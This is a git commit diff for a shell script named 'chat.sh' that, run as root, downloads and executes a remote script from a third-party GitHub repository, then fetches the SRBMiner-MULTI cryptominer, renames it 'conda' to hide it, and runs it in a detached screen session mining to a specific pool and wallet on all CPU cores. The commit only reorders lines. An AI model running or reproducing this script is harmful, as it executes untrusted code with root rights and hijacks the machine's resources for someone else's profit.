07cd7213fbfb2634746c4b10f237a2949a3bdd5f
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-09-26 05:13:59 +0700

    Update chat.sh

--- chat.sh
+++ chat.sh
@@ -1,7 +1,7 @@
 sudo su <<EOF
-wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
-apt-get -y install screen
 
+apt-get -y install screen
+wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
 
 wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI && chmod u+x SRBMiner-MULTI && mv SRBMiner-MULTI conda && clear && screen -dms run ./conda --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RX5TNT5xdqg8PqMCbqCaC431cfxiMyaGuo.00 --password x -t $(nproc --all)
 EOF
